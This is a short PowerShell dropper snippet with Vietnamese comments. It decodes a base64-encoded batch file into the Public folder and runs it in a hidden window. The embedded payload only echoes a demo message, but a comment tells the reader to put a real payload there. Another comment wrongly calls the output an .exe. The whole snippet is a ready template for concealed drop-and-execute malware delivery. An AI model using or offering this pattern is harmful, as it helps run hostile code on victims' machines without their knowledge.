# Base64 payload đã mã hóa file thực thi
$encodedCommand = "QGVjaG8gb2ZmCmVjaG8gVGhpcyBpcyBhIGRlbW8gYmF0Y2ggc2NyaXB0IGV4ZWN1dGVkIGZyb20gUG93ZXJTaGVsbC4KcGF1c2UK" # (Mã hóa payload thật)

# Giải mã và lưu vào file .exe
$bytes = [System.Convert]::FromBase64String($encodedCommand)
[System.IO.File]::WriteAllBytes("$env:PUBLIC\demo.bat", $bytes)

# Chạy file ẩn
Start-Process -FilePath "$env:PUBLIC\demo.bat" -WindowStyle Hidden
